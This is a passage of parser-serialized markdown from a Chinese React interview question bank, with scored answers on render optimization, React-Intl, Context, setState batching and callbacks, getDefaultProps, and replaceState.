级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"React 基于虚拟 DOM 和高效 Diff 算法的完美配合，实现了对 DOM 最小粒度的更新。大多数情况下，React 对 DOM 的渲染效率足以业务日常。但在个别复杂业务场景下，性能问题依然会困扰我们。此时需要采取一些措施来提升运行性能，其很重要的一个方向，就是避免不必要的渲染（Render）。这里提下优化的点","text":"React 基于虚拟 DOM 和高效 Diff 算法的完美配合，实现了对 DOM 最小粒度的更新。大多数情况下，React 对 DOM 的渲染效率足以业务日常。但在个别复杂业务场景下，性能问题依然会困扰我们。此时需要采取一些措施来提升运行性能，其很重要的一个方向，就是避免不必要的渲染（Render）。这里提下优化的点","tokens":[{"type":"text","raw":"React 基于虚拟 DOM 和高效 Diff 算法的完美配合，实现了对 DOM 最小粒度的更新。大多数情况下，React 对 DOM 的渲染效率足以业务日常。但在个别复杂业务场景下，性能问题依然会困扰我们。此时需要采取一些措施来提升运行性能，其很重要的一个方向，就是避免不必要的渲染（Render）。这里提下优化的点","text":"React 基于虚拟 DOM 和高效 Diff 算法的完美配合，实现了对 DOM 最小粒度的更新。大多数情况下，React 对 DOM 的渲染效率足以业务日常。但在个别复杂业务场景下，性能问题依然会困扰我们。此时需要采取一些措施来提升运行性能，其很重要的一个方向，就是避免不必要的渲染（Render）。这里提下优化的点","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- shouldComponentUpdate 和 PureComponent","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- shouldComponentUpdate 和 PureComponent","task":false,"loose":false,"text":"shouldComponentUpdate 和 PureComponent","tokens":[{"type":"text","raw":"shouldComponentUpdate 和 PureComponent","text":"shouldComponentUpdate 和 PureComponent","tokens":[{"type":"text","raw":"shouldComponentUpdate 和 PureComponent","text":"shouldComponentUpdate 和 PureComponent","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在 React 类组件中，可以利用 shouldComponentUpdate或者 PureComponent 来减少因父组件更新而触发子组件的 render，从而达到目的。shouldComponentUpdate 来决定是否组件是否重新渲染，如果不希望组件重新渲染，返回 false 即可。","text":"在 React 类组件中，可以利用 shouldComponentUpdate或者 PureComponent 来减少因父组件更新而触发子组件的 render，从而达到目的。shouldComponentUpdate 来决定是否组件是否重新渲染，如果不希望组件重新渲染，返回 false 即可。","tokens":[{"type":"text","raw":"在 React 类组件中，可以利用 shouldComponentUpdate或者 PureComponent 来减少因父组件更新而触发子组件的 render，从而达到目的。shouldComponentUpdate 来决定是否组件是否重新渲染，如果不希望组件重新渲染，返回 false 即可。","text":"在 React 类组件中，可以利用 shouldComponentUpdate或者 PureComponent 来减少因父组件更新而触发子组件的 render，从而达到目的。shouldComponentUpdate 来决定是否组件是否重新渲染，如果不希望组件重新渲染，返回 false 即可。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 利用高阶组件","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 利用高阶组件","task":false,"loose":false,"text":"利用高阶组件","tokens":[{"type":"text","raw":"利用高阶组件","text":"利用高阶组件","tokens":[{"type":"text","raw":"利用高阶组件","text":"利用高阶组件","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在函数组件中，并没有 shouldComponentUpdate 这个生命周期，可以利用高阶组件，封装一个类似 PureComponet 的功能","text":"在函数组件中，并没有 shouldComponentUpdate 这个生命周期，可以利用高阶组件，封装一个类似 PureComponet 的功能","tokens":[{"type":"text","raw":"在函数组件中，并没有 shouldComponentUpdate 这个生命周期，可以利用高阶组件，封装一个类似 PureComponet 的功能","text":"在函数组件中，并没有 shouldComponentUpdate 这个生命周期，可以利用高阶组件，封装一个类似 PureComponet 的功能","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 使用 React.memo","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 使用 React.memo","task":false,"loose":false,"text":"使用 React.memo","tokens":[{"type":"text","raw":"使用 React.memo","text":"使用 React.memo","tokens":[{"type":"text","raw":"使用 React.memo","text":"使用 React.memo","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"React.memo 是 React 16.6 新的一个 API，用来缓存组件的渲染，避免不必要的更新，其实也是一个高阶组件，与 PureComponent 十分类似，但不同的是， React.memo只能用于函数组件。","text":"React.memo 是 React 16.6 新的一个 API，用来缓存组件的渲染，避免不必要的更新，其实也是一个高阶组件，与 PureComponent 十分类似，但不同的是， React.memo只能用于函数组件。","tokens":[{"type":"text","raw":"React.memo 是 React 16.6 新的一个 API，用来缓存组件的渲染，避免不必要的更新，其实也是一个高阶组件，与 PureComponent 十分类似，但不同的是， React.memo只能用于函数组件。","text":"React.memo 是 React 16.6 新的一个 API，用来缓存组件的渲染，避免不必要的更新，其实也是一个高阶组件，与 PureComponent 十分类似，但不同的是， React.memo只能用于函数组件。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 45. 对 React-Intl 的理解，它的工作原理？\\n\\n","depth":2,"text":"45. 对 React-Intl 的理解，它的工作原理？","tokens":[{"type":"text","raw":"45. 对 React-Intl 的理解，它的工作原理？","text":"45. 对 React-Intl 的理解，它的工作原理？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"React-intl是雅虎的语言国际化开源项目FormatJS的一部分，通过其提供的组件和API可以与ReactJS绑定。","text":"React-intl是雅虎的语言国际化开源项目FormatJS的一部分，通过其提供的组件和API可以与ReactJS绑定。","tokens":[{"type":"text","raw":"React-intl是雅虎的语言国际化开源项目FormatJS的一部分，通过其提供的组件和API可以与ReactJS绑定。","text":"React-intl是雅虎的语言国际化开源项目FormatJS的一部分，通过其提供的组件和API可以与ReactJS绑定。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"React-intl提供了两种使用方法，一种是引用React组件，另一种是直接调取API，官方更加推荐在React项目中使用前者，只有在无法使用React组件的地方，才应该调用框架提供的API。它提供了一系列的React组件，包括数字格式化、字符串格式化、日期格式化等。","text":"React-intl提供了两种使用方法，一种是引用React组件，另一种是直接调取API，官方更加推荐在React项目中使用前者，只有在无法使用React组件的地方，才应该调用框架提供的API。它提供了一系列的React组件，包括数字格式化、字符串格式化、日期格式化等。","tokens":[{"type":"text","raw":"React-intl提供了两种使用方法，一种是引用React组件，另一种是直接调取API，官方更加推荐在React项目中使用前者，只有在无法使用React组件的地方，才应该调用框架提供的API。它提供了一系列的React组件，包括数字格式化、字符串格式化、日期格式化等。","text":"React-intl提供了两种使用方法，一种是引用React组件，另一种是直接调取API，官方更加推荐在React项目中使用前者，只有在无法使用React组件的地方，才应该调用框架提供的API。它提供了一系列的React组件，包括数字格式化、字符串格式化、日期格式化等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在React-intl中，可以配置不同的语言包，他的工作原理就是根据需要，在语言包之间进行切换。","text":"在React-intl中，可以配置不同的语言包，他的工作原理就是根据需要，在语言包之间进行切换。","tokens":[{"type":"text","raw":"在React-intl中，可以配置不同的语言包，他的工作原理就是根据需要，在语言包之间进行切换。","text":"在React-intl中，可以配置不同的语言包，他的工作原理就是根据需要，在语言包之间进行切换。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 46. 为什么React并不推荐优先考虑使用Context？\\n\\n","depth":2,"text":"46. 为什么React并不推荐优先考虑使用Context？","tokens":[{"type":"text","raw":"46. 为什么React并不推荐优先考虑使用Context？","text":"46. 为什么React并不推荐优先考虑使用Context？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Context目前还处于实验阶段，可能会在后面的发行版本中有很大的变化，事实上这种情况已经发生了，所以为了避免给今后升级带来大的影响和麻烦，不建议在app中使用context。","text":"Context目前还处于实验阶段，可能会在后面的发行版本中有很大的变化，事实上这种情况已经发生了，所以为了避免给今后升级带来大的影响和麻烦，不建议在app中使用context。","tokens":[{"type":"text","raw":"Context目前还处于实验阶段，可能会在后面的发行版本中有很大的变化，事实上这种情况已经发生了，所以为了避免给今后升级带来大的影响和麻烦，不建议在app中使用context。","text":"Context目前还处于实验阶段，可能会在后面的发行版本中有很大的变化，事实上这种情况已经发生了，所以为了避免给今后升级带来大的影响和麻烦，不建议在app中使用context。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"尽管不建议在app中使用context，但是独有组件而言，由于影响范围小于app，如果可以做到高内聚，不破坏组件树之间的依赖关系，可以考虑使用context","text":"尽管不建议在app中使用context，但是独有组件而言，由于影响范围小于app，如果可以做到高内聚，不破坏组件树之间的依赖关系，可以考虑使用context","tokens":[{"type":"text","raw":"尽管不建议在app中使用context，但是独有组件而言，由于影响范围小于app，如果可以做到高内聚，不破坏组件树之间的依赖关系，可以考虑使用context","text":"尽管不建议在app中使用context，但是独有组件而言，由于影响范围小于app，如果可以做到高内聚，不破坏组件树之间的依赖关系，可以考虑使用context","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"对于组件之间的数据通信或者状态管理，有效使用props或者state解决，然后再考虑使用第三方的成熟库进行解决，以上的方法都不是最佳的方案的时候，在考虑context。","text":"对于组件之间的数据通信或者状态管理，有效使用props或者state解决，然后再考虑使用第三方的成熟库进行解决，以上的方法都不是最佳的方案的时候，在考虑context。","tokens":[{"type":"text","raw":"对于组件之间的数据通信或者状态管理，有效使用props或者state解决，然后再考虑使用第三方的成熟库进行解决，以上的方法都不是最佳的方案的时候，在考虑context。","text":"对于组件之间的数据通信或者状态管理，有效使用props或者state解决，然后再考虑使用第三方的成熟库进行解决，以上的方法都不是最佳的方案的时候，在考虑context。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"context的更新需要通过setState()触发，但是这并不是很可靠的，Context支持跨组件的访问，但是如果中间的子组件通过一些方法不影响更新，比如 shouldComponentUpdate() 返回false 那么不能保证Context的更新一定可以使用Context的子组件，因此，Context的可靠性需要关注","text":"context的更新需要通过setState()触发，但是这并不是很可靠的，Context支持跨组件的访问，但是如果中间的子组件通过一些方法不影响更新，比如 shouldComponentUpdate() 返回false 那么不能保证Context的更新一定可以使用Context的子组件，因此，Context的可靠性需要关注","tokens":[{"type":"text","raw":"context的更新需要通过setState()触发，但是这并不是很可靠的，Context支持跨组件的访问，但是如果中间的子组件通过一些方法不影响更新，比如 shouldComponentUpdate() 返回false 那么不能保证Context的更新一定可以使用Context的子组件，因此，Context的可靠性需要关注","text":"context的更新需要通过setState()触发，但是这并不是很可靠的，Context支持跨组件的访问，但是如果中间的子组件通过一些方法不影响更新，比如 shouldComponentUpdate() 返回false 那么不能保证Context的更新一定可以使用Context的子组件，因此，Context的可靠性需要关注","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 47. React中的setState批量更新的过程是什么？\\n\\n","depth":2,"text":"47. React中的setState批量更新的过程是什么？","tokens":[{"type":"text","raw":"47. React中的setState批量更新的过程是什么？","text":"47. React中的setState批量更新的过程是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"调用 setState 时，组件的 state 并不会立即改变， setState 只是把要修改的 state 放入一个队列， React 会优化真正的执行时机，并出于性能原因，会将 React 事件处理程序中的多次React 事件处理程序中的多次 setState 的状态修改合并成一次状态修改。 最终更新只产生一次组件及其子组件的重新渲染，这对于大型应用程序中的性能提升至关重要。","text":"调用 setState 时，组件的 state 并不会立即改变， setState 只是把要修改的 state 放入一个队列， React 会优化真正的执行时机，并出于性能原因，会将 React 事件处理程序中的多次React 事件处理程序中的多次 setState 的状态修改合并成一次状态修改。 最终更新只产生一次组件及其子组件的重新渲染，这对于大型应用程序中的性能提升至关重要。","tokens":[{"type":"text","raw":"调用 setState 时，组件的 state 并不会立即改变， setState 只是把要修改的 state 放入一个队列， React 会优化真正的执行时机，并出于性能原因，会将 React 事件处理程序中的多次React 事件处理程序中的多次 setState 的状态修改合并成一次状态修改。 最终更新只产生一次组件及其子组件的重新渲染，这对于大型应用程序中的性能提升至关重要。","text":"调用 setState 时，组件的 state 并不会立即改变， setState 只是把要修改的 state 放入一个队列， React 会优化真正的执行时机，并出于性能原因，会将 React 事件处理程序中的多次React 事件处理程序中的多次 setState 的状态修改合并成一次状态修改。 最终更新只产生一次组件及其子组件的重新渲染，这对于大型应用程序中的性能提升至关重要。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"需要注意的是，只要同步代码还在执行，“攒起来”这个动作就不会停止。（注：这里之所以多次 +1 最终只有一次生效，是因为在同一个方法中多次 setState 的合并动作不是单纯地将更新累加。比如这里对于相同属性的设置，React 只会为其保留最后一次的更新）。","text":"需要注意的是，只要同步代码还在执行，“攒起来”这个动作就不会停止。（注：这里之所以多次 +1 最终只有一次生效，是因为在同一个方法中多次 setState 的合并动作不是单纯地将更新累加。比如这里对于相同属性的设置，React 只会为其保留最后一次的更新）。","tokens":[{"type":"text","raw":"需要注意的是，只要同步代码还在执行，“攒起来”这个动作就不会停止。（注：这里之所以多次 +1 最终只有一次生效，是因为在同一个方法中多次 setState 的合并动作不是单纯地将更新累加。比如这里对于相同属性的设置，React 只会为其保留最后一次的更新）。","text":"需要注意的是，只要同步代码还在执行，“攒起来”这个动作就不会停止。（注：这里之所以多次 +1 最终只有一次生效，是因为在同一个方法中多次 setState 的合并动作不是单纯地将更新累加。比如这里对于相同属性的设置，React 只会为其保留最后一次的更新）。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 48. React中有使用过getDefaultProps吗？它有什么作用？\\n\\n","depth":2,"text":"48. React中有使用过getDefaultProps吗？它有什么作用？","tokens":[{"type":"text","raw":"48. React中有使用过getDefaultProps吗？它有什么作用？","text":"48. React中有使用过getDefaultProps吗？它有什么作用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"通过实现组件的getDefaultProps，对属性设置默认值（ES5的写法）：","text":"通过实现组件的getDefaultProps，对属性设置默认值（ES5的写法）：","tokens":[{"type":"text","raw":"通过实现组件的getDefaultProps，对属性设置默认值（ES5的写法）：","text":"通过实现组件的getDefaultProps，对属性设置默认值（ES5的写法）：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nvar ShowTitle = React.createClass({\\n  getDefaultProps:function(){\\n    return{\\n      title : \\"React\\"\\n    }\\n  },\\n  render : function(){\\n    return <h1>{this.props.title}</h1>\\n  }\\n});\\n\\n```","lang":"js","text":"\\nvar ShowTitle = React.createClass({\\n  getDefaultProps:function(){\\n    return{\\n      title : \\"React\\"\\n    }\\n  },\\n  render : function(){\\n    return <h1>{this.props.title}</h1>\\n  }\\n});\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 49. React中setState的第二个参数作用是什么？\\n\\n","depth":2,"text":"49. React中setState的第二个参数作用是什么？","tokens":[{"type":"text","raw":"49. React中setState的第二个参数作用是什么？","text":"49. React中setState的第二个参数作用是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"setState 的第二个参数是一个可选的回调函数。这个回调函数将在组件重新渲染后执行。等价于在 componentDidUpdate 生命周期内执行。通常建议使用 componentDidUpdate 来代替此方式。在这个回调函数中你可以拿到更新后 state 的值：","text":"setState 的第二个参数是一个可选的回调函数。这个回调函数将在组件重新渲染后执行。等价于在 componentDidUpdate 生命周期内执行。通常建议使用 componentDidUpdate 来代替此方式。在这个回调函数中你可以拿到更新后 state 的值：","tokens":[{"type":"text","raw":"setState 的第二个参数是一个可选的回调函数。这个回调函数将在组件重新渲染后执行。等价于在 componentDidUpdate 生命周期内执行。通常建议使用 componentDidUpdate 来代替此方式。在这个回调函数中你可以拿到更新后 state 的值：","text":"setState 的第二个参数是一个可选的回调函数。这个回调函数将在组件重新渲染后执行。等价于在 componentDidUpdate 生命周期内执行。通常建议使用 componentDidUpdate 来代替此方式。在这个回调函数中你可以拿到更新后 state 的值：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nthis.setState({\\n    key1: newState1,\\n    key2: newState2,\\n    ...\\n}, callback) // 第二个参数是 state 更新完成后的回调函数\\n\\n```","lang":"js","text":"\\nthis.setState({\\n    key1: newState1,\\n    key2: newState2,\\n    ...\\n}, callback) // 第二个参数是 state 更新完成后的回调函数\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 50. React中的setState和replaceState的区别是什么？\\n\\n","depth":2,"text":"50. React中的setState和replaceState的区别是什么？","tokens":[{"type":"text","raw":"50. React中的setState和replaceState的区别是什么？","text":"50. React中的setState和replaceState的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"（1）setState() setState()用于设置状态对象，其语法如下：","text":"（1）setState() setState()用于设置状态对象，其语法如下：","tokens":[{"type":"text","raw":"（1）setState() setState()用于设置状态对象，其语法如下：","text":"（1）setState() setState()用于设置状态对象，其语法如下：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nsetState(object nextState[, function callback])\\n\\n```","lang":"js","text":"\\nsetState(object nextState[, function callback])\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- nextState，将要设置的新状态，该状态会和当前的state合并\\n\\n- callback，可选参数。回调函数。将在组件重新渲染后执行。在这个回调函数中你可以拿到更新后 state 的值","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- nextState，将要设置的新状态，该状态会和当前的state合并\\n\\n","task":false,"loose":true,"text":"nextState，将要设置的新状态，该状态会和当前的state合并\\n","tokens":[{"type":"text","raw":"nextState，将要设置的新状态，该状态会和当前的state合并\\n","text":"nextState，将要设置的新状态，该状态会和当前的state合并","tokens":[{"type":"text","raw":"nextState，将要设置的新状态，该状态会和当前的state合并","text":"nextState，将要设置的新状态，该状态会和当前的state合并","escaped":false}]}]},{"type":"list_item","raw":"- callback，可选参数。回调函数。将在组件重新渲染后执行。在这个回调函数中你可以拿到更新后 state 的值","task":false,"loose":true,"text":"callback，可选参数。回调函数。将在组件重新渲染后执行。在这个回调函数中你可以拿到更新后 state 的值","tokens":[{"type":"text","raw":"callback，可选参数。回调函数。将在组件重新渲染后执行。在这个回调函数中你可以拿到更新后 state 的值","text":"callback，可选参数。回调函数。将在组件重新渲染后执行。在这个回调函数中你可以拿到更新后 state 的值","tokens":[{"type":"text","raw":"callback，可选参数。回调函数。将在组件重新渲染后执行。在这个回调函数中你可以拿到更新后 state 的值","text":"callback，可选参数。回调函数。将在组件重新渲染后执行。在这个回调函数中你可以拿到更新后 state 的值","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"合并nextState和当前state，并重新渲染组件。setState是React事件处理函数中和请求回调函数中触发UI更新的主要方法。","text":"合并nextState和当前state，并重新渲染组件。setState是React事件处理函数中和请求回调函数中触发UI更新的主要方法。","tokens":[{"type":"text","raw":"合并nextState和当前state，并重新渲染组件。setState是React事件处理函数中和请求回调函数中触发UI更新的主要方法。","text":"合并nextState和当前state，并重新渲染组件。setState是React事件处理函数中和请求回调函数中触发UI更新的主要方法。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"（2）replaceState() replaceState()方法与setState()类似，但是方法只会保留nextState中状态，原state不在nextState中的状态都会被删除。其语法如下","text":"（2）replaceState() replaceState()方法与setState()类似，但是方法只会保留nextState中状态，原state不在nextState中的状态都会被删除。其语法如下","tokens":[{"type":"text","raw":"（2）replaceState() replaceState()方法与setState()类似，但是方法只会保留nextState中状态，原state不在nextState中的状态都会被删除。其语法如下","text":"（2）replaceState() replaceState()方法与setState()类似，但是方法只会保留nextState中状态，原state不在nextState中的状态都会被删除。其语法如下","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nreplaceState(object nextState[, function callback])\\n\\n```","lang":"js","text":"\\nreplaceState(object nextState[, function callback])\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- nextState，将要设置的新状态，该状态会替换当前的state。\\n\\n- callback，可选参数，回调函数。该函数会在replaceState设置成功，且组件重新渲染后调用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- nextState，将要设置的新状态，该状态会替换当前的state。\\n\\n","task":false,"loose":true,"text":"nextState，将要设置的新状态，该状态会替换当前的state。\\n","tokens":[{"type":"text","raw":"nextState，将要设置的新状态，该状态会替换当前的state。\\n","text":"nextState，将要设置的新状态，该状态会替换当前的state。","tokens":[{"type":"text","raw":"nextState，将要设置的新状态，该状态会替换当前的state。","text":"nextState，将要设置的新状态，该状态会替换当前的state。","escaped":false}]}]},{"type":"list_item","raw":"- callback，可选参数，回调函数。该函数会在replaceState设置成功，且组件重新渲染后调用。","task":false,"loose":true,"text":"callback，可选参数，回调函数。该函数会在replaceState设置成功，且组件重新渲染后调用。","tokens":[{"type":"text","raw":"callback，可选参数，回调函数。该函数会在replaceState设置成功，且组件重新渲染后调用。","text":"callback，可选参数，回调函数。该函数会在replaceState设置成功，且组件重新渲染后调用。","tokens":[{"type":"text","raw":"callback，可选参数，回调函数。该函数会在replaceState设置成功，且组件重新渲染后调用。","text":"callback，可选参数，回调函数。该函数会在replaceState设置成功，且组件重新渲染后调用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"总结： setState 是修改其中的部分状态，相当于 Object.assign，只是覆盖，不会减少原来的状态。而replaceState 是完全替换原来的状态，相当于赋值，将原来的 state 替换为另一个对象，如果新状态属性减少，那么 state 中就没有这个状态了。","text":"总结： setState 是修改其中的部分状态，相当于 Object.assign，只是覆盖，不会减少原来的状态。而replaceState 是完全替换原来的状态，相当于赋值，将原来的 state 替换为另一个对象，如果新状态属性减少，那么 state 中就没有这个状态了。","tokens":[{"type":"text","raw":"总结： setState 